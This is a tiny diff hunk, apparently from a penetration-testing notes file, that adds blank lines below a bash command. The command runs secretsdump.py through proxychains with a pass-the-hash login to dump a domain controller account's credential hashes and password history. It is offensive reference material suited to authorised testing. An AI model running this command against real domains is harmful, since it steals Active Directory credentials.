@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:01.289773+00:00'
 ```bash
 proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
 ```
+
+
